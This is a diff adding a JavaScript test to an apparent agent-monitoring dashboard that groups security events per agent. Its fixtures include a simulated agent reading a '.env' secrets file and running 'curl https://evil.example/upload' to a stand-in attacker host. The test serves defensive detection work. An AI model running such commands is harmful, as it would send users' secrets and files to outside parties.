@@ -125,6 +125,62 @@ test('maps OS PID agent metadata into dashboard agent columns', () => {
   assert.equal(backendFlow.tasks[0].decision, 'allow');
 });
 
+test('maps previously unknown OS Guard agents into dynamic dashboard columns', () => {
+  const model = buildDashboardModel({
+    events: [
+      {
+        id: 'evt_demo_open',
+        timestamp: '2026-04-26T00:00:00.000Z',
+        event: {
+          type: 'os',
+          text: 'os open path=".env" pid=43210 agent=demo mode=simulate',
+          source: 'agent:demo:os',
+          meta: {
+            operation: 'open',
+            path: '.env',
+            pid: 43210,
+            agent: 'demo'
+          }
+        },
+        decision: 'block',
+        findings: [{ id: 'os-sensitive-file-open', severity: 'critical' }]
+      },
+      {
+        id: 'evt_exfil_exec',
+        timestamp: '2026-04-26T00:00:01.000Z',
+        event: {
+          type: 'os',
+          text: 'os exec argv="curl https://evil.example/upload" pid=43210 agent=exfil-agent mode=simulate',
+          source: 'agent:exfil-agent:os',
+          meta: {
+            operation: 'exec',
+            argv: ['curl', 'https://evil.example/upload'],
+            executable: 'curl',
+            pid: 43210,
+            agent: 'exfil-agent'
+          }
+        },
+        decision: 'warn',
+        findings: [{ id: 'os-network-tool-exec', severity: 'medium' }]
+      }
+    ],
+    candidates: []
+  });
+
+  const demo = model.agentStats.find((agent) => agent.agentId === 'agent-demo');
+  const exfil = model.agentStats.find((agent) => agent.agentId === 'agent-exfil-agent');
+  const demoFlow = model.agentFlows.find((flow) => flow.agentId === 'agent-demo');
+  const exfilFlow = model.agentFlows.find((flow) => flow.agentId === 'agent-exfil-agent');
+
+  assert.equal(demo.total, 1);
+  assert.equal(demo.block, 1);
+  assert.equal(demoFlow.tasks[0].pid, 43210);
+  assert.equal(demoFlow.tasks[0].operation, 'open .env');
+  assert.equal(exfil.total, 1);
+  assert.equal(exfil.warn, 1);
+  assert.equal(exfilFlow.tasks[0].operation, 'curl https://evil.example/upload');
+});
+
 test('builds self-healing dashboard model from pending shadow and approved rules', () => {
   const model = buildDashboardModel({
     events: [
